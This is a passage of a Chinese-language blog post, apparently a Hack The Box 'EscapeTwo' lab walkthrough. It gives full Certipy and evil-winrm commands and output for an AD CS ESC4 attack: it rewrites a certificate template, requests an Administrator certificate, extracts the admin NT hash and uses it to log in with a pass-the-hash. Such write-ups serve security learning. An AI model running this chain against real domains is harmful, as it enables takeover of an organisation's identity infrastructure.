+<li>攻击者（有写属性权限）生成一对 RSA 密钥。</li>
+<li>将<strong>公钥</strong>写入目标用户的 <code>msDS-KeyCredentialLink</code> 属性。</li>
+<li>使用对应的<strong>私钥</strong>，通过 Kerberos 的 <strong>PKINIT</strong> 扩展协议向 KDC 请求 TGT。</li>
+<li>KDC 验证公钥匹配，颁发 TGT。工具从 TGT 中解密出目标的 NTLM Hash。 <strong>优势</strong>：无需重置目标密码，隐蔽性极高。</li>
+</ol>
+</blockquote>
+<p>不管怎么样，现在我们已经拿到了ca_svc的哈希了。</p>
+<p>既然ca_svc是证书发布者，那么以他的身份看看模板是否有漏洞。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(root㉿kaada)-[/home/kali/Desktop]</span><br><span class="hljs-string">└─#</span> <span class="hljs-string">certipy</span> <span class="hljs-string">find</span> <span class="hljs-string">-vulnerable</span> <span class="hljs-string">-u</span> <span class="hljs-string">ca_svc</span> <span class="hljs-string">-hashes</span> <span class="hljs-string">3b181b914e7a9d5508ea1e20bc2b7fce</span> <span class="hljs-string">-dc-ip</span> <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.117</span>  <span class="hljs-string">-stdout</span><br><span class="hljs-string">Certipy</span> <span class="hljs-string">v4.8.2</span> <span class="hljs-bullet">-</span> <span class="hljs-string">by</span> <span class="hljs-string">Oliver</span> <span class="hljs-string">Lyak</span> <span class="hljs-string">(ly4k)</span><br><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Finding</span> <span class="hljs-string">certificate</span> <span class="hljs-string">templates</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Found</span> <span class="hljs-number">34</span> <span class="hljs-string">certificate</span> <span class="hljs-string">templates</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Finding</span> <span class="hljs-string">certificate</span> <span class="hljs-string">authorities</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Found</span> <span class="hljs-number">1</span> <span class="hljs-string">certificate</span> <span class="hljs-string">authority</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Found</span> <span class="hljs-number">12</span> <span class="hljs-string">enabled</span> <span class="hljs-string">certificate</span> <span class="hljs-string">templates</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Trying</span> <span class="hljs-string">to</span> <span class="hljs-string">get</span> <span class="hljs-string">CA</span> <span class="hljs-string">configuration</span> <span class="hljs-string">for</span> <span class="hljs-string">&#x27;sequel-DC01-CA&#x27;</span> <span class="hljs-string">via</span> <span class="hljs-string">CSRA</span><br>[<span class="hljs-type">!]</span> <span class="hljs-string">Got</span> <span class="hljs-string">error</span> <span class="hljs-string">while</span> <span class="hljs-string">trying</span> <span class="hljs-string">to</span> <span class="hljs-string">get</span> <span class="hljs-string">CA</span> <span class="hljs-string">configuration</span> <span class="hljs-string">for</span> <span class="hljs-string">&#x27;sequel-DC01-CA&#x27;</span> <span class="hljs-attr">via CSRA: Could not connect:</span> <span class="hljs-string">timed</span> <span class="hljs-string">out</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">Trying</span> <span class="hljs-string">to</span> <span class="hljs-string">get</span> <span class="hljs-string">CA</span> <span class="hljs-string">configuration</span> <span class="hljs-string">for</span> <span class="hljs-string">&#x27;sequel-DC01-CA&#x27;</span> <span class="hljs-string">via</span> <span class="hljs-string">RRP</span><br>[<span class="hljs-type">!]</span> <span class="hljs-string">Got</span> <span class="hljs-string">error</span> <span class="hljs-string">while</span> <span class="hljs-string">trying</span> <span class="hljs-string">to</span> <span class="hljs-string">get</span> <span class="hljs-string">CA</span> <span class="hljs-string">configuration</span> <span class="hljs-string">for</span> <span class="hljs-string">&#x27;sequel-DC01-CA&#x27;</span> <span class="hljs-attr">via RRP:</span> [<span class="hljs-string">Errno</span> <span class="hljs-string">Connection</span> <span class="hljs-string">error</span> <span class="hljs-string">(198.18.0.20:445)</span>] <span class="hljs-string">timed</span> <span class="hljs-string">out</span><br>[<span class="hljs-type">!]</span> <span class="hljs-string">Failed</span> <span class="hljs-string">to</span> <span class="hljs-string">get</span> <span class="hljs-string">CA</span> <span class="hljs-string">configuration</span> <span class="hljs-string">for</span> <span class="hljs-string">&#x27;sequel-DC01-CA&#x27;</span><br>[<span class="hljs-string">*</span>] <span class="hljs-attr">Enumeration output:</span><br><span class="hljs-string">Certificate</span> <span class="hljs-string">Authorities</span><br>  <span class="hljs-number">0</span><br>    <span class="hljs-attr">CA Name                             :</span> <span class="hljs-string">sequel-DC01-CA</span><br>    <span class="hljs-attr">DNS Name                            :</span> <span class="hljs-string">DC01.sequel.htb</span><br>    <span class="hljs-attr">Certificate Subject                 :</span> <span class="hljs-string">CN=sequel-DC01-CA</span>, <span class="hljs-string">DC=sequel</span>, <span class="hljs-string">DC=htb</span><br>    <span class="hljs-attr">Certificate Serial Number           :</span> <span class="hljs-string">152DBD2D8E9C079742C0F3BFF2A211D3</span><br>    <span class="hljs-attr">Certificate Validity Start          :</span> <span class="hljs-number">2024-06-08 16:50:40+00:00</span><br>    <span class="hljs-attr">Certificate Validity End            :</span> <span class="hljs-number">2124-06-08 17:00:40+00:00</span><br>    <span class="hljs-attr">Web Enrollment                      :</span> <span class="hljs-string">Disabled</span><br>    <span class="hljs-attr">User Specified SAN                  :</span> <span class="hljs-string">Unknown</span><br>    <span class="hljs-attr">Request Disposition                 :</span> <span class="hljs-string">Unknown</span><br>    <span class="hljs-attr">Enforce Encryption for Requests     :</span> <span class="hljs-string">Unknown</span><br><span class="hljs-string">Certificate</span> <span class="hljs-string">Templates</span><br>  <span class="hljs-number">0</span><br>    <span class="hljs-attr">Template Name                       :</span> <span class="hljs-string">DunderMifflinAuthentication</span><br>    <span class="hljs-attr">Display Name                        :</span> <span class="hljs-string">Dunder</span> <span class="hljs-string">Mifflin</span> <span class="hljs-string">Authentication</span><br>    <span class="hljs-attr">Certificate Authorities             :</span> <span class="hljs-string">sequel-DC01-CA</span><br>    <span class="hljs-attr">Enabled                             :</span> <span class="hljs-literal">True</span><br>    <span class="hljs-attr">Client Authentication               :</span> <span class="hljs-literal">True</span><br>    <span class="hljs-attr">Enrollment Agent                    :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Any Purpose                         :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Enrollee Supplies Subject           :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Certificate Name Flag               :</span> <span class="hljs-string">SubjectRequireCommonName</span><br>                                          <span class="hljs-string">SubjectAltRequireDns</span><br>    <span class="hljs-attr">Enrollment Flag                     :</span> <span class="hljs-string">AutoEnrollment</span><br>                                          <span class="hljs-string">PublishToDs</span><br>    <span class="hljs-attr">Private Key Flag                    :</span> <span class="hljs-number">16842752</span><br>    <span class="hljs-attr">Extended Key Usage                  :</span> <span class="hljs-string">Client</span> <span class="hljs-string">Authentication</span><br>                                          <span class="hljs-string">Server</span> <span class="hljs-string">Authentication</span><br>    <span class="hljs-attr">Requires Manager Approval           :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Requires Key Archival               :</span> <span class="hljs-literal">False</span><br>    <span class="hljs-attr">Authorized Signatures Required      :</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">Validity Period                     :</span> <span class="hljs-number">1000 </span><span class="hljs-string">years</span><br>    <span class="hljs-attr">Renewal Period                      :</span> <span class="hljs-number">6</span> <span class="hljs-string">weeks</span><br>    <span class="hljs-attr">Minimum RSA Key Length              :</span> <span class="hljs-number">2048</span><br>    <span class="hljs-string">Permissions</span><br>      <span class="hljs-string">Enrollment</span> <span class="hljs-string">Permissions</span><br>        <span class="hljs-attr">Enrollment Rights               :</span> <span class="hljs-string">SEQUEL.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>      <span class="hljs-string">Object</span> <span class="hljs-string">Control</span> <span class="hljs-string">Permissions</span><br>        <span class="hljs-attr">Owner                           :</span> <span class="hljs-string">SEQUEL.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>        <span class="hljs-attr">Full Control Principals         :</span> <span class="hljs-string">SEQUEL.HTB\Cert</span> <span class="hljs-string">Publishers</span><br>        <span class="hljs-attr">Write Owner Principals          :</span> <span class="hljs-string">SEQUEL.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Administrator</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Cert</span> <span class="hljs-string">Publishers</span><br>        <span class="hljs-attr">Write Dacl Principals           :</span> <span class="hljs-string">SEQUEL.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Administrator</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Cert</span> <span class="hljs-string">Publishers</span><br>        <span class="hljs-attr">Write Property Principals       :</span> <span class="hljs-string">SEQUEL.HTB\Domain</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Enterprise</span> <span class="hljs-string">Admins</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Administrator</span><br>                                          <span class="hljs-string">SEQUEL.HTB\Cert</span> <span class="hljs-string">Publishers</span><br>    [<span class="hljs-type">!]</span> <span class="hljs-string">Vulnerabilities</span><br>      <span class="hljs-attr">ESC4                              :</span> <span class="hljs-string">&#x27;SEQUEL.HTB\\Cert Publishers&#x27;</span> <span class="hljs-string">has</span> <span class="hljs-string">dangerous</span> <span class="hljs-string">permissions</span><br>                                                                                  <br></code></pre></td></tr></table></figure>
+
+<p>利用 <code>ca_svc</code> 的 Hash 登录，发现其属于 <code>Cert Publishers</code> 组，且该组对 <code>DunderMifflinAuthentication</code> 证书模板有写权限，符合 <strong>ESC4</strong> 漏洞特征</p>
+<p>利用ca_svc的权限对DunderMifflinAuthentication进行覆盖更新（太卡了又换ip了）</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌─[root@htb<span class="hljs-number">-4</span>w9mye2vqf]─[/home/skyarrow/Desktop]<br>└──╼ #certipy <span class="hljs-keyword">template</span> -u ca_svc -hashes <span class="hljs-number">3</span>b181b914e7a9d5508ea1e20bc2b7fce -dc-ip <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.117</span> -<span class="hljs-keyword">template</span> DunderMifflinAuthentication -target dc01.sequel.htb -save-<span class="hljs-built_in">old</span><br>Certipy v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - <span class="hljs-keyword">by</span> Oliver Lyak (ly4k)<br><br>[*] Saved <span class="hljs-built_in">old</span> <span class="hljs-keyword">configuration</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;DunderMifflinAuthentication&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;DunderMifflinAuthentication.json&#x27;</span><br>[*] Updating certificate <span class="hljs-keyword">template</span> <span class="hljs-string">&#x27;DunderMifflinAuthentication&#x27;</span><br>[*] Successfully updated <span class="hljs-string">&#x27;DunderMifflinAuthentication&#x27;</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>之后用改造好的模板请求管理员证书，注意，这里一定要在更新后迅速执行该命令。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">┌─<span class="hljs-selector-attr">[root@htb-4w9mye2vqf]</span>─<span class="hljs-selector-attr">[/home/skyarrow/Desktop]</span><br>└──╼ <span class="hljs-selector-id">#certipy</span> req -u ca_svc@sequel<span class="hljs-selector-class">.htb</span> -hashes <span class="hljs-string">&#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27;</span> -ca sequel-DC01-CA -template <span class="hljs-string">&#x27;DunderMifflinAuthentication&#x27;</span> -upn Administrator@sequel<span class="hljs-selector-class">.htb</span> -target DC01<span class="hljs-selector-class">.sequel</span><span class="hljs-selector-class">.htb</span> -ns <span class="hljs-number">10.129</span>.<span class="hljs-number">186.117</span> -dns <span class="hljs-number">10.129</span>.<span class="hljs-number">186.117</span> -dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">186.117</span><br>Certipy v4.<span class="hljs-number">8.2</span> - by Oliver Lyak (ly4k)<br><br><span class="hljs-selector-attr">[*]</span> Requesting certificate via RPC<br><span class="hljs-selector-attr">[*]</span> Successfully requested certificate<br><span class="hljs-selector-attr">[*]</span> Request ID is <span class="hljs-number">11</span><br><span class="hljs-selector-attr">[*]</span> Got certificate with multiple identifications<br>    UPN: <span class="hljs-string">&#x27;Administrator@sequel.htb&#x27;</span><br>    DNS Host Name: <span class="hljs-string">&#x27;10.129.186.117&#x27;</span><br><span class="hljs-selector-attr">[*]</span> Certificate has no <span class="hljs-selector-tag">object</span> SID<br><span class="hljs-selector-attr">[*]</span> Saved certificate and private key to <span class="hljs-string">&#x27;administrator_10.pfx&#x27;</span><br>┌─<span class="hljs-selector-attr">[root@htb-4w9mye2vqf]</span>─<span class="hljs-selector-attr">[/home/skyarrow/Desktop]</span><br><br></code></pre></td></tr></table></figure>
+
+<p>通过证书获取到管理员哈希</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">┌─<span class="hljs-selector-attr">[root@htb-4w9mye2vqf]</span>─<span class="hljs-selector-attr">[/home/skyarrow/Desktop]</span><br>└──╼ <span class="hljs-selector-id">#certipy</span> auth -pfx administrator_10<span class="hljs-selector-class">.pfx</span><br>Certipy v4.<span class="hljs-number">8.2</span> - by Oliver Lyak (ly4k)<br><br><span class="hljs-selector-attr">[*]</span> Found multiple identifications <span class="hljs-keyword">in</span> certificate<br><span class="hljs-selector-attr">[*]</span> Please <span class="hljs-selector-tag">select</span> one:<br>    <span class="hljs-selector-attr">[0]</span> UPN: <span class="hljs-string">&#x27;Administrator@sequel.htb&#x27;</span><br>    <span class="hljs-selector-attr">[1]</span> DNS Host Name: <span class="hljs-string">&#x27;10.129.186.117&#x27;</span><br>&gt; <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[*]</span> Using principal: administrator@sequel<span class="hljs-selector-class">.htb</span><br><span class="hljs-selector-attr">[*]</span> Trying to get TGT...<br><span class="hljs-selector-attr">[*]</span> Got TGT<br><span class="hljs-selector-attr">[*]</span> Saved credential cache to <span class="hljs-string">&#x27;administrator.ccache&#x27;</span><br><span class="hljs-selector-attr">[*]</span> Trying to retrieve NT hash <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator&#x27;</span><br><span class="hljs-selector-attr">[*]</span> Got hash <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>a8d4e04986afa8ed4060f75e5a0b3ff<br><br></code></pre></td></tr></table></figure>
+
+<p>之后直接登录就可以了。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌─[root@htb<span class="hljs-number">-4</span>w9mye2vqf]─[/home/skyarrow/Desktop]<br>└──╼ #evil-winrm -H <span class="hljs-number">7</span>a8d4e04986afa8ed4060f75e5a0b3ff -u <span class="hljs-string">&#x27;administrator&#x27;</span> -i <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.133</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br><span class="hljs-built_in">Warning</span>: Remote <span class="hljs-type">path</span> completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> unimplemented <span class="hljs-keyword">on</span> this machine<br>                                        <br>Data: <span class="hljs-keyword">For</span> more information, <span class="hljs-keyword">check</span> Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-<span class="hljs-type">path</span>-completion<br>                                        <br><span class="hljs-keyword">Info</span>: Establishing <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="hljs-keyword">type</span> root.txt<br><span class="hljs-number">18</span>ff3ce3ee8f6f2a78e10221d0956c59<br><br></code></pre></td></tr></table></figure>
+
+<p><strong>配置即漏洞</strong>：证书模板定义了颁发证书的规则。 <strong>ESC4 (Vulnerable Template Access Control)</strong>：攻击者对模板对象有写权限。 <strong>ESC1 (SAN Spoofing)</strong>：攻击者通过修改配置，开启 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志位。这允许申请者在 CSR (证书签名请求) 的 <strong>SAN (Subject Alternative Name)</strong> 字段中填入任意用户（如 Administrator）。 <strong>最终效果</strong>：AD CS 信任模板配置 -&gt; 签发“管理员”证书 -&gt; 域控信任 CA 签发的证书 -&gt; 攻击者获得域管权限。这是一个从“配置权限”到“身份伪造”的完整闭环。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/windows/" class="print-no-link">#windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从零开始的windows生活-EscapeTwo</div>
+      <div>http://example.com/2026/01/21/从零开始的windows生活-EscapeTwo/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 21, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/18/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Windows%E7%94%9F%E6%B4%BB-Administrator/" title="从零开始的Windows生活-Administrator">
+                        <span class="hidden-mobile">从零开始的Windows生活-Administrator</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
